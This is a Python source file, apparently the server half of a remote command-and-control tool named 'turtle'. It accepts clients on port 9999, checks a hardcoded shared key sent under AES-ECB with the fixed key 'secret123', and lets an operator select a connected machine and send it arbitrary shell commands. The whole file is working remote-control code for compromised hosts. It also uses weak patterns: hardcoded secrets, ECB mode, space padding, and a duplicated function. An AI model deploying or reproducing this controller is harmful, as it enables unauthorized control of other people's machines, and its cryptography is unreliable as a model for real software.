import commands_handler
import socket
import sys
import threading
import time
from Crypto.Cipher import AES
import getpass
import hashlib


identify=[]


connections = []
addresses = []
Shutdown_Flag = threading.Event()
global current_client
current_client = None
conn_lock = threading.Lock()
key = "password"
aes_key = "secret123"


def hash_string(input_string, method="sha256"):
    try:
        hash_func = getattr(hashlib, method)
    except AttributeError:
        return "error"

    hashed = hash_func(input_string.encode()).hexdigest()
    return hashed


def id_generator():
    id_generator.counter += 1
    return id_generator.counter

id_generator.counter = 0  # initialize the counter


def hash_string(input_string, method="sha256"):
    try:
        hash_func = getattr(hashlib, method)
    except AttributeError:
        return "error"

    hashed = hash_func(input_string.encode()).hexdigest()
    return hashed


def pad(text):
    while len(text) % 16 != 0:
        text += ' '
    return text

def decrypt(encrypted_bytes, key):
    key = pad(key)[:16].encode()
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_text = cipher.decrypt(encrypted_bytes).decode().rstrip()
    return decrypted_text

def sock():
    try:
        print(commands_handler.interface())
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print("Listening on port:9999")
        s.bind(("0.0.0.0", 9999))
        s.listen(5)
        return s

    except KeyboardInterrupt:
        print("server shutting down!\n")
        s.close()
        sys.exit(1)

def Connection_Handling():
    while not Shutdown_Flag.is_set():
        try:
            conn, addr = s.accept()
            conn.send(b"server up!")
            client_key = conn.recv(1024)
            try:
                decrypted_key = decrypt(client_key, aes_key)
            except Exception as e:
                print(f"Decryption failed from {addr}: {e}")
                conn.close()
                continue

            if decrypted_key == key:
                with conn_lock:
                    addresses.append(addr)
                    connections.append(conn)
                print(f"Established connection with {addr[0]}:{addr[1]}\n")
                conn.send(b"Key exchange succeded!\n")
                client_name=conn.recv(2048)
                client_name=client_name.decode()
                identify.append({"name":client_name,"id":id_generator(),"hash_User":hash_string(client_name)})
                kk=len(identify)-1
                print(identify[kk])
            else:
                print(f"Invalid key from {addr}")
                conn.close()
            
           
        except (OSError, socket.error):
            break



def turtle():
    global current_client
    while not Shutdown_Flag.is_set():
        try:
            prompt = f"{current_client} > " if current_client else "turtle > "
            cmd = input(prompt)

            if not cmd:
                continue
            elif cmd == "list":
                list_connections()
            elif cmd=="logo":
                commands_handler.print_logo()
            elif cmd == "help":
                print(commands_handler.execution_args_help_message())
            elif cmd == "exit":
                Shutdown_Flag.set()
            elif "select" in cmd:
                try:
                    
                    target = int(cmd.replace("select ", ""))
                    conn = connections[target]
                    current_client = addresses[target]
                except:
                    print("Invalid Client Index\n")
            elif current_client:
                with conn_lock:
                    i = addresses.index(current_client)
                    conn = connections[i]
                    send_commands(conn, cmd)
            else:
                print("Client not found!\n")
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down command interface...")
            Shutdown_Flag.set()
            break

def list_connections():
    print("--- ACTIVE CLIENTS ---")
    for i, addr in enumerate(addresses):
        print(f"{i}     {addr[0]}    {addr[1]}")

def send_commands(conn, cmd):
    try:
        conn.send(cmd.encode())
        client_response = conn.recv(50000).decode()
        print(client_response, end='')
    except (ConnectionResetError, BrokenPipeError):
        print("Client disconnected!")
        with conn_lock:
            if conn in connections:
                index = connections.index(conn)
                global current_client
                if current_client == addresses[index]:
                    current_client = None
                del connections[index]
                del addresses[index]
    except KeyboardInterrupt:
        raise

def cleanup(sock):
    with conn_lock:
        for conn in connections:
            conn.close()
    sock.close()

def main():
    s = sock()
    conn_thread = threading.Thread(target=Connection_Handling)
    conn_thread.start()
    try:
        turtle()
    finally:
        Shutdown_Flag.set()
        cleanup(s)

main()